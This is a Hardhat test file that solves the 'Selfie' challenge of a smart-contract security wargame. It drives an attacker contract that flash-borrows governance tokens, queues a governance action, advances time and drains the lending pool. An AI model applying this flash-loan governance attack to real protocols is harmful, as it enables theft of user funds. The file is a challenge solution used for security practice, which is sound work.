import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers, upgrades } from "hardhat";
import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
import { BigNumber } from "ethers";


describe("Selfie Test", function () {
    let deployer: SignerWithAddress;
    let attacker: SignerWithAddress;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

  async function setupFixture() {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();
    const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
    const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
    const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
    const SelfieHackerFactory = await ethers.getContractFactory('SelfieHacker', deployer);

    const token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
    const governance = await SimpleGovernanceFactory.deploy(token.address);
    const pool = await SelfiePoolFactory.deploy(
        token.address,
        governance.address    
    );
    
    const selfieHacker = await SelfieHackerFactory.connect(attacker).deploy(pool.address, governance.address);

    await token.transfer(pool.address, TOKENS_IN_POOL);

    return {pool, token, selfieHacker, governance};
    
  }
    it("Deployment", async function () {
        const {pool, token} = await loadFixture(setupFixture);
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it("Exploit", async function () {
        const {pool, token, selfieHacker, governance} = await loadFixture(setupFixture);
        
        await selfieHacker.connect(attacker).hack(ethers.BigNumber.from("1000000000000000000000002")); // borrow 1mln of tokens to become a voter
        
        // advance time to specific timestamp and mine a new block
        const timenow = (await ethers.provider.getBlock((await ethers.provider.getBlockNumber()))).timestamp + 2 * 24 * 3600; // plus two days
        await time.increaseTo(timenow);
        await governance.connect(attacker).executeAction(1);
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await token.balanceOf(pool.address)
        ).to.be.equal('0');

    });
  });
